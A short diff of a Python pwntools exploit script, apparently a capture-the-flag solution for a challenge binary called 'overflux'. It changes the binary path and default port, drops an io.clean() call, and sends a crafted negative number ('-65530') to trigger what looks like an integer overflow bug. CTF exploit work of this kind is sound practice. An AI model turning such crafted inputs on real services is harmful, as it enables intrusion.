@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = context.binary = ELF(args.EXE or '../src/overflux')
+exe = context.binary = ELF(args.EXE or '../pub/overflux')
 
 host = args.HOST or '127.0.0.1'
-port = int(args.PORT or 8889)
+port = int(args.PORT or 10002)
 
 def start_local(argv=[], *a, **kw):
     if args.GDB:
@@ -25,7 +25,6 @@ def start(argv=[], *a, **kw):
         return start_remote(argv, *a, **kw)
 
 io = start()
-io.clean()
 io.sendlineafter(b"(0 to finish):",b"-65530")
 io.sendlineafter(b"(0 to finish):",b"0")
 
